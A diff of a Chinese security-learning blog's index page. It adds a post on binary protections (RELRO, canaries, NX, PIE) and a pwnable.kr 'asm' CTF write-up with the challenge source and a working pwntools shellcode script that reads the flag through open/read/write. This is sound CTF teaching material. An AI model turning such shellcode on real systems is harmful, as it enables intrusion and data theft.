@@ -216,7 +216,7 @@
 
     
 
-    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Startseite</a>
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
 
   </li>
         
@@ -233,7 +233,7 @@
 
     
 
-    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>Über</a>
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>Informazioni su</a>
 
   </li>
         
@@ -267,7 +267,7 @@
 
     
 
-    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>Kategorien</a>
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categorie</a>
 
   </li>
         
@@ -284,7 +284,7 @@
 
     
 
-    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archiv</a>
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archivi</a>
 
   </li>
         
@@ -301,7 +301,7 @@
 
     
 
-    <a href="/schedule/" rel="section"><i class="menu-item-icon fa fa-fw fa-calendar"></i> <br>Schedule</a>
+    <a href="/schedule/" rel="section"><i class="menu-item-icon fa fa-fw fa-calendar"></i> <br>Programma</a>
 
   </li>
 
@@ -337,6 +337,365 @@
           <div id="content" class="content">
             
   <section id="posts" class="posts-expand">
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://betterlh.github.io/2019/05/14/pwn入门/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="lh">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/05/14/pwn入门/" class="post-title-link" itemprop="url">pwn入门（脚本检测与各类防护技术）</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Scritto il</span>
+              
+
+              
+                
+              
+
+              <time title="Post creato: 2019-05-14 09:03:11" itemprop="dateCreated datePublished" datetime="2019-05-14T09:03:11+08:00">2019-05-14</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Post modificato: 2019-07-13 23:35:48" itemprop="dateModified" datetime="2019-07-13T23:35:48+08:00">2019-07-13</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="脚本检测与各类防护技术"><a href="#脚本检测与各类防护技术" class="headerlink" title="脚本检测与各类防护技术"></a>脚本检测与各类防护技术</h2><p>使用checksec，</p>
+<h3 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO:"></a>RELRO:</h3><p>在Linux系统安全领域数据可以写的存储区就会是攻击的目标，尤其是存储函数指针的区域，尽量减少可写的存储区域可使安全系数提高。GCC, GNU linker以及Glibc-dynamic linker一起配合实现了一种叫做relro的技术Relocation Read Only, 重定向只读，实现就是由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读。（参考RELRO技术细节）</p>
+<h3 id="Stack-栈溢出检查，"><a href="#Stack-栈溢出检查，" class="headerlink" title="Stack: 栈溢出检查，"></a>Stack: 栈溢出检查，</h3><p>用Canary金丝雀值是否变化来检测,Canary found表示开启。<br>金丝雀最早指的是矿工曾利用金丝雀来确认是否有气体泄漏，如果金丝雀因为气体泄漏而中毒死亡，可以给矿工预警。这里是一种缓冲区溢出攻击缓解手段：启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux将cookie信息称为Canary。</p>
+<h3 id="NX-No-Execute，栈不可执行，"><a href="#NX-No-Execute，栈不可执行，" class="headerlink" title="NX: No Execute，栈不可执行，"></a>NX: No Execute，栈不可执行，</h3><p>也就是windows上的DEP。<br><img src="/2019/05/14/pwn入门/check1.webp" alt=""></p>
+<p> 分析缓冲区溢出攻击，其根源在于现代计算机对数据和代码没有明确区分这一先天缺陷，就目前来看重新去设计计算机体系结构基本上是不可能的，我们只能靠向前兼容的修补来减少溢出带来的损害，DEP就是用来弥补计算机对数据和代码混淆这一天然缺陷的。</p>
+<p>DEP的基本原理是<strong>将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</strong>DEP的主要作用是阻止数据页（如默认的堆页、各种堆栈页以及内存池页）执行代码。硬件DEP需要CPU的支持，AMD和Intel都为此做了设计，AMD称之为No-Execute Page-Protection（NX），Intel称之为Execute Disable Bit（XD）<br>Linux称为 NX 与 DEP原理相同</p>
+<h3 id="PIE-位置无关"><a href="#PIE-位置无关" class="headerlink" title="PIE: 位置无关"></a>PIE: 位置无关</h3><p>position-independent executables, 位置无关的可执行文件，也就是常说的<strong>ASLR(Address space layout randomization) 地址随机化</strong>，<strong>程序每次启动基址都随机</strong>。</p>
+<p>作者：SueLyon<br>链接：<a href="https://www.jianshu.com/p/6e528b33e37a" target="_blank" rel="noopener">https://www.jianshu.com/p/6e528b33e37a</a><br>来源：简书<br>简书著作权归作者所有，任何形式的转载都请联系作者获得授权并注明出处。</p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://betterlh.github.io/2019/05/07/pwnable-kr8-asm/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="lh">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/05/07/pwnable-kr8-asm/" class="post-title-link" itemprop="url">pwnable-asm</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Scritto il</span>
+              
+
+              
+                
+              
+
+              <time title="Post creato: 2019-05-07 14:30:18" itemprop="dateCreated datePublished" datetime="2019-05-07T14:30:18+08:00">2019-05-07</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Post modificato: 2019-05-13 21:25:14" itemprop="dateModified" datetime="2019-05-13T21:25:14+08:00">2019-05-13</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p>代码asm.c<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LENGTH 128</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sandbox</span><span class="params">()</span></span>&#123;</span><br><span class="line">    scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);</span><br><span class="line">    <span class="keyword">if</span> (ctx == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"seccomp error\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(<span class="built_in">exit</span>), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (seccomp_load(ctx) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        seccomp_release(ctx);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"seccomp error\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    seccomp_release(ctx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> stub[] = <span class="string">"\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff"</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> filter[<span class="number">256</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, _IOLBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Welcome to shellcoding practice challenge.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"If this does not challenge you. you should play 'asg' challenge :)\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* sh = (<span class="keyword">char</span>*)mmap(<span class="number">0x41414000</span>, <span class="number">0x1000</span>, <span class="number">7</span>, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(sh, <span class="number">0x90</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(sh, stub, <span class="built_in">strlen</span>(stub));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> offset = <span class="keyword">sizeof</span>(stub);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"give me your x64 shellcode: "</span>);</span><br><span class="line">    read(<span class="number">0</span>, sh+offset, <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">    alarm(<span class="number">10</span>);</span><br><span class="line">    chroot(<span class="string">"/home/asm_pwn"</span>);    <span class="comment">// you are in chroot jail. so you can't use symlink in /tmp</span></span><br><span class="line">    sandbox();</span><br><span class="line">    ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))sh)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>在这里学到可以用pwntools下的disasm函数打开：<br>stub: “\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff”</p>
+<p><img src="/2019/05/07/pwnable-kr8-asm/1.JPG" alt=""><br>dec是 自减操作 相当于c语言中的i–<br>xor表示异或 0xor0=0  0xor1=1 1xor0=1 1xor1=0<br>xor ax，ax  是常见的寄存器清零操作。<br>上面这个即把所有寄存器清零，对写shellcode没影响。<br>再来回顾一下源代码，先用setvbuf设置了一下写入写出的缓冲区，然后为sh分配了0x1000的内存空间并初始化，而且将上边的shellcode拷贝到sh，然后read函数让我们向sh之后的空间内传入自己的shellcode。    </p>
+<p>好像直接写shell code就可以了，题目考察的就是shellcode<br>代码含义，启动沙盒模式，只可使用open，write，read三个函数，构造shellcodeopenflag文件，然后用read读出来，再write到stdout即可<br><img src="/2019/05/07/pwnable-kr8-asm/1.JPG" alt=""></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">con = ssh(host='pwnable.kr', user='asm', password='guest', port=2222)</span><br><span class="line">p = con.connect_remote('localhost', 9026)</span><br><span class="line"></span><br><span class="line">context(os='linux', arch='amd64')</span><br><span class="line">shellcode = <span class="string">""</span></span><br><span class="line">shellcode += shellcraft.pushstr('this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong')</span><br><span class="line">shellcode += shellcraft.open('rsp', 0, 0)</span><br><span class="line">shellcode += shellcraft.read('rax', 'rsp', 100)</span><br><span class="line">shellcode += shellcraft.write(1, 'rsp', 100)</span><br><span class="line"></span><br><span class="line">p.recvuntil('shellcode: ')</span><br><span class="line">p.send(<span class="keyword">asm</span>(shellcode))</span><br><span class="line">print p.recvline()</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/05/07/pwnable-kr8-asm/3.GIF" alt=""></p>
+<h1 id="手写简易shellcode"><a href="#手写简易shellcode" class="headerlink" title="手写简易shellcode"></a>手写简易shellcode</h1><p><a href="http://blog.nsfocus.net/simple-realization-hand-handle-shellcode-detailed-explanation/" target="_blank" rel="noopener">http://blog.nsfocus.net/simple-realization-hand-handle-shellcode-detailed-explanation/</a></p>
+<hr>
+<p>参考网址<br><a href="https://www.cnblogs.com/p4nda/p/7169456.html" target="_blank" rel="noopener">https://www.cnblogs.com/p4nda/p/7169456.html</a><br><a href="https://blog.csdn.net/pwd_3/article/details/78108610" target="_blank" rel="noopener">pwnable之asm</a></p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
     
       
 
@@ -391,14 +750,14 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Veröffentlicht am</span>
+                <span class="post-meta-item-text">Scritto il</span>
               
 
               
                 
               
 
-              <time title="Post created: 2019-05-01 21:06:57" itemprop="dateCreated datePublished" datetime="2019-05-01T21:06:57+08:00">2019-05-01</time>
+              <time title="Post creato: 2019-05-01 21:06:57" itemprop="dateCreated datePublished" datetime="2019-05-01T21:06:57+08:00">2019-05-01</time>
             
 
             
@@ -415,7 +774,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Updated at: 2019-08-17 15:56:31" itemprop="dateModified" datetime="2019-08-17T15:56:31+08:00">2019-08-17</time>
+                <time title="Post modificato: 2019-08-17 15:56:31" itemprop="dateModified" datetime="2019-08-17T15:56:31+08:00">2019-08-17</time>
               
             
           </span>
@@ -429,7 +788,7 @@
                 <i class="fa fa-folder-o"></i>
               </span>
               
-                <span class="post-meta-item-text">in</span>
+                <span class="post-meta-item-text">In</span>
               
               
                 <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a></span>
@@ -592,14 +951,14 @@ libc = ELF(&apos;./libc-2.24.so&apos;)  //加载库文件
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Veröffentlicht am</span>
+                <span class="post-meta-item-text">Scritto il</span>
               
 
               
                 
               
 
-              <time title="Post created: 2019-04-30 20:54:14" itemprop="dateCreated datePublished" datetime="2019-04-30T20:54:14+08:00">2019-04-30</time>
+              <time title="Post creato: 2019-04-30 20:54:14" itemprop="dateCreated datePublished" datetime="2019-04-30T20:54:14+08:00">2019-04-30</time>
             
 
             
@@ -616,7 +975,7 @@ libc = ELF(&apos;./libc-2.24.so&apos;)  //加载库文件
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Updated at: 2019-05-14 08:35:22" itemprop="dateModified" datetime="2019-05-14T08:35:22+08:00">2019-05-14</time>
+                <time title="Post modificato: 2019-05-14 08:35:22" itemprop="dateModified" datetime="2019-05-14T08:35:22+08:00">2019-05-14</time>
               
             
           </span>
@@ -630,7 +989,7 @@ libc = ELF(&apos;./libc-2.24.so&apos;)  //加载库文件
                 <i class="fa fa-folder-o"></i>
               </span>
               
-                <span class="post-meta-item-text">in</span>
+                <span class="post-meta-item-text">In</span>
               
               
                 <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a></span>
@@ -768,14 +1127,14 @@ libc = ELF(&apos;./libc-2.24.so&apos;)  //加载库文件
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Veröffentlicht am</span>
+                <span class="post-meta-item-text">Scritto il</span>
               
 
               
                 
               
 
-              <time title="Post created: 2019-04-27 09:41:02" itemprop="dateCreated datePublished" datetime="2019-04-27T09:41:02+08:00">2019-04-27</time>
+              <time title="Post creato: 2019-04-27 09:41:02" itemprop="dateCreated datePublished" datetime="2019-04-27T09:41:02+08:00">2019-04-27</time>
             
 
             
@@ -792,7 +1151,7 @@ libc = ELF(&apos;./libc-2.24.so&apos;)  //加载库文件
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Updated at: 2019-04-28 15:49:46" itemprop="dateModified" datetime="2019-04-28T15:49:46+08:00">2019-04-28</time>
+                <time title="Post modificato: 2019-04-28 15:49:46" itemprop="dateModified" datetime="2019-04-28T15:49:46+08:00">2019-04-28</time>
               
             
           </span>
@@ -940,14 +1299,14 @@ libc = ELF(&apos;./libc-2.24.so&apos;)  //加载库文件
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Veröffentlicht am</span>
+                <span class="post-meta-item-text">Scritto il</span>
               
 
               
                 
               
 
-              <time title="Post created: 2019-04-22 22:35:19" itemprop="dateCreated datePublished" datetime="2019-04-22T22:35:19+08:00">2019-04-22</time>
+              <time title="Post creato: 2019-04-22 22:35:19" itemprop="dateCreated datePublished" datetime="2019-04-22T22:35:19+08:00">2019-04-22</time>
             
 
             
@@ -964,7 +1323,7 @@ libc = ELF(&apos;./libc-2.24.so&apos;)  //加载库文件
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Updated at: 2019-04-26 19:09:56" itemprop="dateModified" datetime="2019-04-26T19:09:56+08:00">2019-04-26</time>
+                <time title="Post modificato: 2019-04-26 19:09:56" itemprop="dateModified" datetime="2019-04-26T19:09:56+08:00">2019-04-26</time>
               
             
           </span>
@@ -978,7 +1337,7 @@ libc = ELF(&apos;./libc-2.24.so&apos;)  //加载库文件
                 <i class="fa fa-folder-o"></i>
               </span>
               
-                <span class="post-meta-item-text">in</span>
+                <span class="post-meta-item-text">In</span>
               
               
                 <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a></span>
@@ -1146,14 +1505,14 @@ argv[&apos;C&apos;] =&quot;55555&quot;;
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Veröffentlicht am</span>
+                <span class="post-meta-item-text">Scritto il</span>
               
 
               
                 
               
 
-              <time title="Post created: 2019-04-20 14:31:12 / Updated at: 21:04:16" itemprop="dateCreated datePublished" datetime="2019-04-20T14:31:12+08:00">2019-04-20</time>
+              <time title="Post creato: 2019-04-20 14:31:12 / Post modificato: 21:04:16" itemprop="dateCreated datePublished" datetime="2019-04-20T14:31:12+08:00">2019-04-20</time>
             
 
             
@@ -1172,7 +1531,7 @@ argv[&apos;C&apos;] =&quot;55555&quot;;
                 <i class="fa fa-folder-o"></i>
               </span>
               
-                <span class="post-meta-item-text">in</span>
+                <span class="post-meta-item-text">In</span>
               
               
                 <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a></span>
@@ -1311,14 +1670,14 @@ argv[&apos;C&apos;] =&quot;55555&quot;;
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Veröffentlicht am</span>
+                <span class="post-meta-item-text">Scritto il</span>
               
 
               
                 
               
 
-              <time title="Post created: 2019-04-19 11:05:15" itemprop="dateCreated datePublished" datetime="2019-04-19T11:05:15+08:00">2019-04-19</time>
+              <time title="Post creato: 2019-04-19 11:05:15" itemprop="dateCreated datePublished" datetime="2019-04-19T11:05:15+08:00">2019-04-19</time>
             
 
             
@@ -1335,7 +1694,7 @@ argv[&apos;C&apos;] =&quot;55555&quot;;
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Updated at: 2019-04-20 14:12:26" itemprop="dateModified" datetime="2019-04-20T14:12:26+08:00">2019-04-20</time>
+                <time title="Post modificato: 2019-04-20 14:12:26" itemprop="dateModified" datetime="2019-04-20T14:12:26+08:00">2019-04-20</time>
               
             
           </span>
@@ -1349,7 +1708,7 @@ argv[&apos;C&apos;] =&quot;55555&quot;;
                 <i class="fa fa-folder-o"></i>
               </span>
               
-                <span class="post-meta-item-text">in</span>
+                <span class="post-meta-item-text">In</span>
               
               
                 <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a></span>
@@ -1499,14 +1858,14 @@ rand()产生的是伪随机数字，每次执行时是相同的; 若要不同, �
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Veröffentlicht am</span>
+                <span class="post-meta-item-text">Scritto il</span>
               
 
               
                 
               
 
-              <time title="Post created: 2019-04-16 14:43:46" itemprop="dateCreated datePublished" datetime="2019-04-16T14:43:46+08:00">2019-04-16</time>
+              <time title="Post creato: 2019-04-16 14:43:46" itemprop="dateCreated datePublished" datetime="2019-04-16T14:43:46+08:00">2019-04-16</time>
             
 
             
@@ -1523,7 +1882,7 @@ rand()产生的是伪随机数字，每次执行时是相同的; 若要不同, �
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Updated at: 2019-08-19 17:58:23" itemprop="dateModified" datetime="2019-08-19T17:58:23+08:00">2019-08-19</time>
+                <time title="Post modificato: 2019-08-19 17:58:23" itemprop="dateModified" datetime="2019-08-19T17:58:23+08:00">2019-08-19</time>
               
             
           </span>
@@ -1537,7 +1896,7 @@ rand()产生的是伪随机数字，每次执行时是相同的; 若要不同, �
                 <i class="fa fa-folder-o"></i>
               </span>
               
-                <span class="post-meta-item-text">in</span>
+                <span class="post-meta-item-text">In</span>
               
               
                 <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a></span>
@@ -1718,14 +2077,14 @@ rand()产生的是伪随机数字，每次执行时是相同的; 若要不同, �
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Veröffentlicht am</span>
+                <span class="post-meta-item-text">Scritto il</span>
               
 
               
                 
               
 
-              <time title="Post created: 2019-04-13 20:33:40" itemprop="dateCreated datePublished" datetime="2019-04-13T20:33:40+08:00">2019-04-13</time>
+              <time title="Post creato: 2019-04-13 20:33:40" itemprop="dateCreated datePublished" datetime="2019-04-13T20:33:40+08:00">2019-04-13</time>
             
 
             
@@ -1742,7 +2101,7 @@ rand()产生的是伪随机数字，每次执行时是相同的; 若要不同, �
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Updated at: 2019-04-17 13:06:19" itemprop="dateModified" datetime="2019-04-17T13:06:19+08:00">2019-04-17</time>
+                <time title="Post modificato: 2019-04-17 13:06:19" itemprop="dateModified" datetime="2019-04-17T13:06:19+08:00">2019-04-17</time>
               
             
           </span>
@@ -1756,7 +2115,7 @@ rand()产生的是伪随机数字，每次执行时是相同的; 若要不同, �
                 <i class="fa fa-folder-o"></i>
               </span>
               
-                <span class="post-meta-item-text">in</span>
+                <span class="post-meta-item-text">In</span>
               
               
                 <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a></span>
